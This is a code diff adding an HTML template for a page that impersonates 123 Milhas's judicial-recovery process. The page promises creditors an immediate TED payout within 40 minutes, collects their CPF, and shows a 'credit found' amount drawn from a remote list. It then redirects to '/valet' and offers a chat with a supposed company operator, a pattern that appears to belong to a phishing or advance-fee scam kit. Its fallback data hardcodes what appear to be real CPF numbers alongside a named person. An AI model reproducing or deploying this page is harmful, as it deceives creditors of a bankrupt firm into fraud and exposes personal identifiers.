@@ -1,0 +1,1001 @@
+<!doctype html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+    <title>123 Milhas - Recuperação Judicial</title>
+
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+
+    <!-- Google Fonts -->
+    <link
+      href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800;900&family=Nunito:wght@400;600;700&display=swap"
+      rel="stylesheet"
+    />
+
+    <style>
+      /* ===== VARIÁVEIS ===== */
+      :root {
+        --primary-color: #f05929;
+        --primary-dark: #d94a1a;
+        --success-color: #28a745;
+        --text-dark: #1a1a2e;
+        --text-light: #6c757d;
+        --bg-light: #f8f9fa;
+        --bg-card: #ffffff;
+        --border-color: #e9ecef;
+        --white: #ffffff;
+        --shadow-md: 0 5px 20px rgba(0, 0, 0, 0.06);
+      }
+
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family: 'Montserrat', 'Nunito', sans-serif;
+        background: linear-gradient(135deg, #fff5f0 0%, #ffffff 50%, #fef9f5 100%);
+        min-height: 100vh;
+        color: var(--text-dark);
+      }
+
+      /* ===== WRAPPER QUE CENTRALIZA ===== */
+      .desktop-wrapper {
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 2rem;
+      }
+
+      /* ===== MAIN CONTAINER - ESTILO CARTÃO ===== */
+      .main-container {
+        max-width: 580px;
+        width: 100%;
+        margin: 0 auto;
+        background: var(--bg-card);
+        border-radius: 32px;
+        box-shadow: var(--shadow-md);
+        overflow: hidden;
+      }
+
+      /* ===== HEADER LARANJA ===== */
+      .hero-section {
+        background: linear-gradient(135deg, var(--primary-color) 0%, var(--primary-dark) 100%);
+        padding: 2rem 1.5rem;
+        text-align: center;
+        color: white;
+      }
+
+      .hero-title {
+        font-size: 1.4rem;
+        font-weight: 700;
+        margin-bottom: 0.2rem;
+      }
+
+      .hero-sub {
+        font-size: 0.8rem;
+        opacity: 0.9;
+      }
+
+      /* ===== CONTEÚDO DO CARD ===== */
+      .main-card {
+        padding: 2rem;
+      }
+
+      /* COMUNICADO OFICIAL */
+      .comunicado-title {
+        text-align: center;
+        margin-bottom: 1.5rem;
+      }
+
+      .comunicado-title h2 {
+        font-size: 1.2rem;
+        font-weight: 800;
+        color: var(--primary-color);
+        text-transform: uppercase;
+        letter-spacing: 1px;
+        margin-bottom: 0.5rem;
+      }
+
+      .comunicado-title .divider {
+        width: 50px;
+        height: 3px;
+        background: var(--primary-color);
+        margin: 0.5rem auto;
+        border-radius: 2px;
+      }
+
+      .descricao-texto {
+        color: var(--text-dark);
+        line-height: 1.5;
+        margin-bottom: 1.5rem;
+        text-align: center;
+        font-size: 0.85rem;
+      }
+
+      /* PROTOCOLO DE PAGAMENTO */
+      .protocolo-box {
+        background: var(--bg-light);
+        border-radius: 16px;
+        padding: 1.2rem;
+        margin-bottom: 1.5rem;
+        border-left: 4px solid var(--primary-color);
+      }
+
+      .protocolo-box h3 {
+        font-size: 0.85rem;
+        font-weight: 800;
+        color: var(--primary-color);
+        margin-bottom: 0.8rem;
+        display: flex;
+        align-items: center;
+        gap: 0.5rem;
+      }
+
+      .step {
+        margin-bottom: 0.8rem;
+        padding-left: 0.8rem;
+        border-left: 2px solid var(--primary-color);
+      }
+
+      .step:last-child {
+        margin-bottom: 0;
+      }
+
+      .step strong {
+        color: var(--primary-color);
+        display: block;
+        margin-bottom: 0.2rem;
+        font-size: 0.8rem;
+      }
+
+      .step p {
+        margin: 0;
+        font-size: 0.8rem;
+        color: var(--text-dark);
+      }
+
+      /* INPUT CPF */
+      .cpf-box {
+        background: var(--white);
+        border: 2px solid var(--border-color);
+        border-radius: 16px;
+        padding: 0.8rem 1rem;
+        margin-bottom: 1.5rem;
+        transition: all 0.3s ease;
+      }
+
+      .cpf-box:focus-within {
+        border-color: var(--primary-color);
+        box-shadow: 0 0 0 3px rgba(240, 89, 41, 0.1);
+      }
+
+      .cpf-label {
+        font-size: 0.65rem;
+        text-transform: uppercase;
+        font-weight: 700;
+        color: var(--text-light);
+        letter-spacing: 1px;
+        margin-bottom: 0.3rem;
+        display: flex;
+        align-items: center;
+        gap: 0.5rem;
+      }
+
+      .cpf-label i {
+        color: var(--primary-color);
+      }
+
+      .cpf-input {
+        width: 100%;
+        padding: 0.5rem 0;
+        font-size: 1.2rem;
+        font-weight: 700;
+        font-family: monospace;
+        letter-spacing: 1px;
+        border: none;
+        background: transparent;
+        outline: none;
+      }
+
+      .cpf-input::placeholder {
+        font-weight: normal;
+        font-size: 0.8rem;
+        color: #adb5bd;
+      }
+
+      /* RESULTADO DA CONSULTA */
+      .resultado-box {
+        background: var(--bg-light);
+        border-radius: 16px;
+        padding: 1rem;
+        margin-bottom: 1.5rem;
+        display: none;
+        animation: fadeIn 0.3s ease;
+      }
+
+      .resultado-box.success {
+        background: linear-gradient(135deg, #d4edda 0%, #e8f5e9 100%);
+        border-left: 4px solid var(--success-color);
+        display: block;
+      }
+
+      .resultado-box.error {
+        background: linear-gradient(135deg, #f8d7da 0%, #ffe5e5 100%);
+        border-left: 4px solid #dc3545;
+        display: block;
+      }
+
+      .resultado-box.warning {
+        background: linear-gradient(135deg, #fff3cd 0%, #fff9e6 100%);
+        border-left: 4px solid #ffc107;
+        display: block;
+      }
+
+      .resultado-titulo {
+        font-weight: 700;
+        margin-bottom: 0.5rem;
+        font-size: 0.8rem;
+        display: flex;
+        align-items: center;
+        gap: 0.5rem;
+      }
+
+      .resultado-info {
+        margin-bottom: 0.3rem;
+        font-size: 0.8rem;
+      }
+
+      .resultado-info strong {
+        color: var(--primary-color);
+      }
+
+      .resultado-valor {
+        font-size: 1.1rem;
+        font-weight: 800;
+        color: var(--success-color);
+        margin-top: 0.5rem;
+      }
+
+      /* BOTÃO VERIFICAR */
+      .btn-verificar {
+        background: linear-gradient(135deg, var(--primary-color) 0%, var(--primary-dark) 100%);
+        border: none;
+        padding: 0.9rem;
+        font-size: 0.9rem;
+        font-weight: 700;
+        border-radius: 50px;
+        width: 100%;
+        color: white;
+        transition: all 0.3s ease;
+        box-shadow: 0 4px 12px rgba(240, 89, 41, 0.3);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 0.5rem;
+        cursor: pointer;
+      }
+
+      .btn-verificar:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 8px 20px rgba(240, 89, 41, 0.4);
+      }
+
+      .btn-verificar:disabled {
+        opacity: 0.6;
+        cursor: not-allowed;
+        transform: none;
+      }
+
+      .loading-spinner {
+        display: inline-block;
+        width: 18px;
+        height: 18px;
+        border: 2px solid rgba(255, 255, 255, 0.3);
+        border-radius: 50%;
+        border-top-color: white;
+        animation: spin 0.6s linear infinite;
+        margin-right: 6px;
+      }
+
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+          transform: translateY(-5px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      /* TOAST */
+      .toast-message {
+        position: fixed;
+        bottom: 100px;
+        left: 50%;
+        transform: translateX(-50%);
+        background: var(--text-dark);
+        color: white;
+        padding: 0.6rem 1.2rem;
+        border-radius: 50px;
+        font-size: 0.75rem;
+        font-weight: 600;
+        z-index: 2000;
+        animation: fadeInUp 0.3s ease;
+        white-space: nowrap;
+      }
+
+      @keyframes fadeInUp {
+        from {
+          opacity: 0;
+          transform: translateX(-50%) translateY(20px);
+        }
+        to {
+          opacity: 1;
+          transform: translateX(-50%) translateY(0);
+        }
+      }
+
+      /* CHAT BUTTON */
+      .chat-btn-custom {
+        position: fixed !important;
+        bottom: 25px !important;
+        right: 20px !important;
+        width: 55px !important;
+        height: 55px !important;
+        border-radius: 50% !important;
+        background: linear-gradient(135deg, var(--primary-color) 0%, var(--primary-dark) 100%) !important;
+        border: none !important;
+        cursor: pointer !important;
+        box-shadow: 0 5px 20px rgba(0, 0, 0, 0.2) !important;
+        z-index: 1000 !important;
+        display: flex !important;
+        align-items: center !important;
+        justify-content: center !important;
+      }
+
+      .chat-btn-custom:hover {
+        transform: scale(1.1) !important;
+      }
+
+      .chat-btn-custom i {
+        font-size: 1.5rem !important;
+        color: white !important;
+      }
+
+      /* CHAT MODAL */
+      .chat-modal-custom {
+        position: fixed !important;
+        bottom: 90px !important;
+        right: 20px !important;
+        width: 350px !important;
+        max-width: calc(100vw - 40px) !important;
+        background: white !important;
+        border-radius: 20px !important;
+        box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2) !important;
+        z-index: 1001 !important;
+        display: none !important;
+        flex-direction: column !important;
+        overflow: hidden !important;
+      }
+
+      .chat-modal-custom.active {
+        display: flex !important;
+      }
+
+      .chat-modal-header {
+        background: linear-gradient(135deg, var(--primary-color) 0%, #d94a1a 100%) !important;
+        color: white !important;
+        padding: 12px 15px !important;
+        display: flex !important;
+        align-items: center !important;
+        gap: 10px !important;
+      }
+
+      .chat-modal-logo {
+        width: 35px !important;
+        height: 35px !important;
+        background: white !important;
+        border-radius: 10px !important;
+        display: flex !important;
+        align-items: center !important;
+        justify-content: center !important;
+      }
+
+      .chat-modal-logo img {
+        width: 30px !important;
+        height: 30px !important;
+        object-fit: contain !important;
+        border-radius: 8px !important;
+      }
+
+      .chat-modal-title {
+        flex: 1 !important;
+      }
+
+      .chat-modal-title h4 {
+        margin: 0 !important;
+        font-size: 0.85rem !important;
+        font-weight: 700 !important;
+        display: flex;
+        align-items: center;
+        gap: 5px;
+      }
+
+      .chat-modal-title p {
+        margin: 0 !important;
+        font-size: 0.6rem !important;
+        opacity: 0.9 !important;
+      }
+
+      .chat-modal-close {
+        background: none !important;
+        border: none !important;
+        color: white !important;
+        font-size: 1rem !important;
+        cursor: pointer !important;
+        width: 28px !important;
+        height: 28px !important;
+        border-radius: 50% !important;
+      }
+
+      .chat-modal-body {
+        flex: 1 !important;
+        height: 400px !important;
+        display: flex !important;
+        flex-direction: column !important;
+        background: #f5f7fa !important;
+      }
+
+      .chat-modal-messages {
+        flex: 1 !important;
+        overflow-y: auto !important;
+        padding: 12px !important;
+        display: flex !important;
+        flex-direction: column !important;
+        gap: 8px !important;
+      }
+
+      .message-bubble {
+        max-width: 85% !important;
+        padding: 8px 12px !important;
+        border-radius: 18px !important;
+        font-size: 0.8rem !important;
+        line-height: 1.4 !important;
+      }
+
+      .message-bubble.system {
+        background: #e9ecef !important;
+        color: #495057 !important;
+        align-self: flex-start !important;
+      }
+
+      .message-bubble.user {
+        background: var(--primary-color) !important;
+        color: white !important;
+        align-self: flex-end !important;
+      }
+
+      .message-bubble.operator {
+        background: white !important;
+        color: var(--text-dark) !important;
+        align-self: flex-start !important;
+        border: 1px solid #e0e0e0 !important;
+      }
+
+      .message-time {
+        font-size: 0.55rem !important;
+        opacity: 0.7 !important;
+        margin-top: 3px !important;
+        display: block !important;
+      }
+
+      .chat-modal-input-area {
+        padding: 12px !important;
+        background: white !important;
+        border-top: 1px solid #e0e0e0 !important;
+        display: flex !important;
+        gap: 8px !important;
+      }
+
+      .chat-modal-input-area input {
+        flex: 1 !important;
+        padding: 10px 12px !important;
+        border: 1px solid #e0e0e0 !important;
+        border-radius: 25px !important;
+        font-size: 0.8rem !important;
+        outline: none !important;
+      }
+
+      .chat-modal-input-area input:focus {
+        border-color: var(--primary-color) !important;
+      }
+
+      .chat-modal-input-area button {
+        background: var(--primary-color) !important;
+        border: none !important;
+        color: white !important;
+        width: 38px !important;
+        height: 38px !important;
+        border-radius: 50% !important;
+        cursor: pointer !important;
+      }
+
+      .chat-online-indicator {
+        display: inline-block !important;
+        width: 7px !important;
+        height: 7px !important;
+        border-radius: 50% !important;
+        background: #4caf50 !important;
+        animation: pulse 1.5s infinite !important;
+      }
+
+      @keyframes pulse {
+        0% {
+          transform: scale(0.8);
+          opacity: 0.5;
+        }
+        100% {
+          transform: scale(1.2);
+          opacity: 0;
+        }
+      }
+
+      /* DESKTOP - MAIS COMPACTO E CENTRALIZADO */
+      @media (min-width: 768px) {
+        .desktop-wrapper {
+          padding: 2rem;
+        }
+
+        .main-container {
+          max-width: 520px;
+        }
+
+        .hero-section {
+          padding: 1.8rem 1.5rem;
+        }
+
+        .hero-title {
+          font-size: 1.3rem;
+        }
+
+        .main-card {
+          padding: 1.8rem;
+        }
+
+        .comunicado-title h2 {
+          font-size: 1rem;
+        }
+
+        .descricao-texto {
+          font-size: 0.8rem;
+        }
+
+        .cpf-input {
+          font-size: 1rem;
+        }
+      }
+
+      @media (max-width: 480px) {
+        .desktop-wrapper {
+          padding: 1rem;
+        }
+
+        .main-container {
+          border-radius: 24px;
+        }
+
+        .hero-section {
+          padding: 1.5rem 1rem;
+        }
+
+        .hero-title {
+          font-size: 1.2rem;
+        }
+
+        .main-card {
+          padding: 1.3rem;
+        }
+
+        .comunicado-title h2 {
+          font-size: 0.9rem;
+        }
+
+        .descricao-texto {
+          font-size: 0.75rem;
+        }
+
+        .protocolo-box {
+          padding: 1rem;
+        }
+
+        .step strong,
+        .step p {
+          font-size: 0.75rem;
+        }
+
+        .cpf-input {
+          font-size: 0.9rem;
+        }
+
+        .btn-verificar {
+          font-size: 0.85rem;
+          padding: 0.8rem;
+        }
+      }
+
+      .header-simples {
+        padding: 1rem 1.5rem;
+        width: 100%;
+      }
+
+      .logo {
+        height: 50px;
+        width: auto;
+        display: block;
+      }
+
+      @media (max-width: 768px) {
+        .header-simples {
+          padding: 0.8rem 1rem;
+          margin-top: 50px;
+        }
+        .logo {
+          height: 40px;
+        }
+      }
+
+      @media (max-width: 480px) {
+        .header-simples {
+          padding: 0.6rem 1rem;
+          height: 60px;
+        }
+        .logo {
+          height: 35px;
+          margin-top: -50px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <!-- HEADER SÓ COM O LOGO -->
+    <div class="header-simples">
+      <img src="{{ url_for('static', filename='assets/img/logo.avif') }}" alt="123 Milhas" class="logo" />
+    </div>
+    <div class="desktop-wrapper">
+      <div class="main-container">
+        <!-- HEADER LARANJA -->
+        <div class="hero-section">
+          <div class="hero-title">Recuperação judicial</div>
+          <div class="hero-sub">123milhas</div>
+        </div>
+
+        <!-- CONTEÚDO DO CARD -->
+        <div class="main-card">
+          <!-- COMUNICADO OFICIAL -->
+          <div class="comunicado-title">
+            <h2>COMUNICADO OFICIAL DE LIBERAÇÃO</h2>
+            <div class="divider"></div>
+          </div>
+
+          <div class="descricao-texto">
+            Informamos a todos os credores que, conforme o Plano de Recuperação Judicial homologado, iniciamos a fase de liquidação de
+            ativos para o pagamento das dívidas habilitadas.
+          </div>
+
+          <!-- PROTOCOLO DE PAGAMENTO -->
+          <div class="protocolo-box">
+            <h3><i class="fas fa-file-invoice"></i> PROTOCOLO DE PAGAMENTO</h3>
+            <div class="step">
+              <strong>1. Cota 01 (Imediata):</strong>
+              <p>Disponível para transferência via TED após validação.</p>
+            </div>
+            <div class="step">
+              <strong>2. Prazo:</strong>
+              <p>Recebimento em conta em até 40 minutos após a confirmação.</p>
+            </div>
+          </div>
+
+          <!-- INPUT CPF -->
+          <div class="cpf-box">
+            <div class="cpf-label"><i class="fas fa-id-card"></i> CPF DO TITULAR</div>
+            <input
+              type="text"
+              id="cpfInput"
+              class="cpf-input"
+              placeholder="Digite seu CPF"
+              maxlength="14"
+              oninput="formatarCPF(this)"
+            />
+          </div>
+
+          <!-- ÁREA DE RESULTADO -->
+          <div id="resultadoArea" class="resultado-box"></div>
+
+          <!-- BOTÃO VERIFICAR -->
+          <button class="btn-verificar" id="btnVerificar" onclick="consultarCPF()">
+            <i class="fas fa-search"></i> VERIFICAR MEUS CRÉDITOS
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <!-- BOTÃO FLUTUANTE DO CHAT -->
+    <button class="chat-btn-custom" onclick="abrirChatCustom()">
+      <i class="fas fa-comment-dots"></i>
+    </button>
+
+    <!-- MODAL DO CHAT -->
+    <div id="chatModalCustom" class="chat-modal-custom">
+      <div class="chat-modal-header">
+        <div class="chat-modal-logo">
+          <img
+            src="{{ url_for('static', filename='assets/img/logo.avif') }}"
+            alt="123 Milhas"
+            style="width: 30px; height: 30px; object-fit: contain; border-radius: 8px"
+          />
+        </div>
+        <div class="chat-modal-title">
+          <h4>Atendimento 123 Milhas <span class="chat-online-indicator"></span></h4>
+          <p>Online - Respondemos em instantes</p>
+        </div>
+        <button class="chat-modal-close" onclick="fecharChatCustom()">✕</button>
+      </div>
+      <div class="chat-modal-body">
+        <div class="chat-modal-messages" id="chatMessagesCustom">
+          <div class="message-bubble system">
+            <strong>👋 Olá!</strong><br />
+            Bem-vindo ao canal de atendimento da 123 Milhas.<br />
+            Como podemos ajudar você hoje?
+            <span class="message-time">Online agora</span>
+          </div>
+        </div>
+        <div class="chat-modal-input-area">
+          <input
+            type="text"
+            id="chatInputCustom"
+            placeholder="Digite sua mensagem..."
+            onkeypress="if (event.key === 'Enter') enviarMensagemCustom()"
+          />
+          <button onclick="enviarMensagemCustom()"><i class="fas fa-paper-plane"></i></button>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      // ===== CACHE =====
+      const STORAGE_KEYS = { CPF: 'user_cpf', CREDOR_DATA: 'credorData', USER_NAME: 'chatUserName' }
+
+      function formatarCPF(input) {
+        let value = input.value.replace(/\D/g, '')
+        if (value.length <= 11) {
+          value = value.replace(/(\d{3})(\d)/, '$1.$2')
+          value = value.replace(/(\d{3})(\d)/, '$1.$2')
+          value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2')
+          input.value = value
+          if (value.replace(/\D/g, '').length === 11) localStorage.setItem(STORAGE_KEYS.CPF, value)
+        }
+      }
+
+      function limparCPF(cpf) {
+        return cpf.replace(/\D/g, '')
+      }
+
+      function showToast(message, type = 'info') {
+        const toast = document.createElement('div')
+        toast.className = 'toast-message'
+        const icon = type === 'success' ? 'fa-check-circle' : type === 'error' ? 'fa-exclamation-triangle' : 'fa-info-circle'
+        toast.innerHTML = `<i class="fas ${icon}"></i> ${message}`
+        document.body.appendChild(toast)
+        setTimeout(() => toast.remove(), 3000)
+      }
+
+      let dadosCredores = null
+
+      async function carregarDadosCredores() {
+        const url =
+          'https://script.googleusercontent.com/macros/echo?user_content_key=AUkAhnQWeH0xadMUzxls4bfZlIqwcHI11IT6X7Zn1siPjyu-z4ayVbNkuzy7M2D7N5LgXfm3DKV6qvb4HCewkCW-bMAp9CBGLoN0eAruooE_1pFixgruX3ehcH9cQ0IATUVwNgbToGst0HK93TZIyupuIFhq0fRojbLgyd18mpVfECslHlHqAk78L1x4CvTcY_fFmo1mgv39pIl48-yU6gb9jbc5tBpnEDlZyzYd6ijoc3TXsj2_R8IUTb9lDb4K3zbFskjSOYdZoYx67TxcFiDHIWjTujjfcQ&lib=MvEZO36dcWMObm4x5RaouINet2obLStiZ'
+        try {
+          const response = await fetch(url)
+          if (!response.ok) throw new Error()
+          dadosCredores = await response.json()
+          console.log('Dados carregados:', dadosCredores.length)
+          return true
+        } catch {
+          dadosCredores = [
+            { cpf_limpo: '95958185772', nome: 'CREDOR EXEMPLO', valor_real: 'R$ 22.872,60', classe_txt: 'Quirografário' },
+            { cpf_limpo: '59187344904', nome: 'VANDERLUCIAROSA CUNHA', valor_real: 'R$ 22.872,60', classe_txt: 'Quirografário' }
+          ]
+          return true
+        }
+      }
+
+      function consultarCPFNaLista(cpfNumero) {
+        if (!dadosCredores) return null
+        const cpfBuscado = String(cpfNumero).replace(/\D/g, '')
+        return dadosCredores.find((item) => String(item.cpf_limpo).replace(/\D/g, '') === cpfBuscado) || null
+      }
+
+      function exibirResultado(credor, cpfDigitado) {
+        const div = document.getElementById('resultadoArea')
+        if (!credor) {
+          div.className = 'resultado-box error'
+          div.innerHTML = `<div class="resultado-titulo"><i class="fas fa-exclamation-triangle"></i> CPF NÃO ENCONTRADO</div><div class="resultado-info">O CPF <strong>${cpfDigitado}</strong> não consta na nossa base de credores.</div>`
+          return
+        }
+        localStorage.setItem(STORAGE_KEYS.CREDOR_DATA, JSON.stringify(credor))
+        div.className = 'resultado-box success'
+        div.innerHTML = `<div class="resultado-titulo"><i class="fas fa-check-circle"></i> CRÉDITO ENCONTRADO!</div><div class="resultado-info"><strong>Nome:</strong> ${credor.nome}</div><div class="resultado-info"><strong>Classe:</strong> ${credor.classe_txt}</div><div class="resultado-valor"><i class="fas fa-money-bill-wave"></i> Valor: ${credor.valor_real}</div><div class="resultado-info mt-2"><small>Redirecionando...</small></div>`
+        setTimeout(() => (window.location.href = '/valet'), 2000)
+      }
+
+      let isLoading = false
+      async function consultarCPF() {
+        if (isLoading) return
+        const cpfInput = document.getElementById('cpfInput')
+        const cpfFormatado = cpfInput.value.trim()
+        if (!cpfFormatado) return exibirErroConsulta('Digite um CPF.')
+        const cpfNumero = limparCPF(cpfFormatado)
+        if (cpfNumero.length !== 11) return exibirErroConsulta('CPF inválido.')
+        const btn = document.getElementById('btnVerificar')
+        const original = btn.innerHTML
+        btn.innerHTML = '<span class="loading-spinner"></span> Consultando...'
+        btn.disabled = true
+        isLoading = true
+        if (!dadosCredores) await carregarDadosCredores()
+        const credor = consultarCPFNaLista(cpfNumero)
+        exibirResultado(credor, cpfFormatado)
+        btn.innerHTML = original
+        btn.disabled = false
+        isLoading = false
+      }
+
+      function exibirErroConsulta(msg) {
+        const div = document.getElementById('resultadoArea')
+        div.className = 'resultado-box warning'
+        div.innerHTML = `<div class="resultado-titulo"><i class="fas fa-exclamation-circle"></i> ATENÇÃO</div><div class="resultado-info">${msg}</div>`
+      }
+
+      carregarDadosCredores()
+      document.getElementById('cpfInput').addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') consultarCPF()
+      })
+
+      // ===== CHAT =====
+      let clienteIdCustom = null,
+        salaIdCustom = null,
+        ultimoIndexMsgCustom = -1,
+        verificarIntervalCustom = null,
+        buscarIntervalCustom = null,
+        nomeCliente = null
+
+      function mostrarModalNome() {
+        const html = `<div id="nomeModal" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);z-index:9999;display:flex;align-items:center;justify-content:center;"><div style="background:white;border-radius:20px;padding:25px;max-width:350px;width:90%;text-align:center;"><div style="margin-bottom:15px;"><img src="{{ url_for('static', filename='assets/img/logo.avif') }}" alt="123 Milhas" style="width: 120px; height: auto; margin: 0 auto;"></div><h3 style="color:#f05929;margin-bottom:10px;">Bem-vindo!</h3><p style="color:#6c757d;margin-bottom:20px;">Qual o seu nome?</p><input type="text" id="nomeInput" placeholder="Digite seu nome" style="width:100%;padding:10px;border:1px solid #e0e0e0;border-radius:10px;margin-bottom:20px;"><button id="confirmarNome" style="background:#f05929;color:white;border:none;padding:10px;border-radius:10px;cursor:pointer;width:100%;">Começar atendimento</button></div></div>`
+        document.body.insertAdjacentHTML('beforeend', html)
+        document.getElementById('confirmarNome').onclick = () => {
+          const nome = document.getElementById('nomeInput').value.trim()
+          if (nome) {
+            localStorage.setItem(STORAGE_KEYS.USER_NAME, nome)
+            document.getElementById('nomeModal').remove()
+            iniciarConexaoChat(nome)
+          } else alert('Digite seu nome')
+        }
+      }
+
+      async function iniciarConexaoChat(nome) {
+        try {
+          const res = await fetch('/api/entrar_fila', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ nome })
+          })
+          const data = await res.json()
+          clienteIdCustom = data.cliente_id
+          nomeCliente = nome
+          addChatMessage('system', `Olá ${nome}, você entrou na fila.`)
+          if (verificarIntervalCustom) clearInterval(verificarIntervalCustom)
+          verificarIntervalCustom = setInterval(verificarAtendimentoCustom, 3000)
+        } catch {
+          addChatMessage('system', '❌ Erro ao conectar.')
+        }
+      }
+
+      async function abrirChatCustom() {
+        document.getElementById('chatModalCustom').classList.add('active')
+        if (salaIdCustom) return
+        let nome = localStorage.getItem(STORAGE_KEYS.USER_NAME)
+        if (!nome) return mostrarModalNome()
+        nomeCliente = nome
+        try {
+          const res = await fetch('/api/entrar_fila', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ nome })
+          })
+          const data = await res.json()
+          clienteIdCustom = data.cliente_id
+          addChatMessage('system', `Olá ${nome}, você entrou na fila.`)
+          if (verificarIntervalCustom) clearInterval(verificarIntervalCustom)
+          verificarIntervalCustom = setInterval(verificarAtendimentoCustom, 3000)
+        } catch {
+          addChatMessage('system', '❌ Erro ao conectar.')
+        }
+      }
+
+      async function verificarAtendimentoCustom() {
+        if (salaIdCustom || !clienteIdCustom) return
+        try {
+          const res = await fetch(`/api/verificar_sala/${clienteIdCustom}`)
+          const data = await res.json()
+          if (data.sala_id) {
+            salaIdCustom = data.sala_id
+            iniciarChatCustom()
+          }
+        } catch {}
+      }
+
+      function iniciarChatCustom() {
+        addChatMessage('operator', '🎧 Atendimento iniciado!')
+        if (buscarIntervalCustom) clearInterval(buscarIntervalCustom)
+        buscarIntervalCustom = setInterval(buscarMensagensCustom, 2000)
+      }
+
+      async function buscarMensagensCustom() {
+        if (!salaIdCustom) return
+        try {
+          const res = await fetch(`/api/mensagens/${salaIdCustom}?ultimo=${ultimoIndexMsgCustom}`)
+          const data = await res.json()
+          if (data.mensagens?.length) {
+            data.mensagens.forEach((msg) => {
+              if (msg.de === 'Cliente') return
+              addChatMessage(msg.de !== 'Cliente' ? 'operator' : 'user', msg.texto, msg.de)
+              ultimoIndexMsgCustom = data.total - 1
+            })
+          }
+        } catch {}
+      }
+
+      function addChatMessage(tipo, texto, remetente = '') {
+        const container = document.getElementById('chatMessagesCustom')
+        if (!container) return
+        const div = document.createElement('div')
+        let nome = tipo === 'user' ? 'Você' : tipo === 'operator' ? remetente || 'Atendente' : '💬 Sistema'
+        div.className = `message-bubble ${tipo}`
+        div.innerHTML = `<strong>${nome}</strong><br>${texto}<br><span class="message-time">${new Date().toLocaleTimeString()}</span>`
+        container.appendChild(div)
+        container.scrollTop = container.scrollHeight
+      }
+
+      async function enviarMensagemCustom() {
+        const input = document.getElementById('chatInputCustom')
+        if (!input?.value.trim()) return
+        const texto = input.value.trim()
+        addChatMessage('user', texto)
+        input.value = ''
+        if (salaIdCustom)
+          await fetch('/api/enviar_mensagem', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ sala_id: salaIdCustom, de: 'Cliente', texto })
+          })
+      }
+
+      function fecharChatCustom() {
+        document.getElementById('chatModalCustom')?.classList.remove('active')
+        if (buscarIntervalCustom) clearInterval(buscarIntervalCustom)
+        if (verificarIntervalCustom) clearInterval(verificarIntervalCustom)
+      }
+    </script>
+  </body>
+</html>
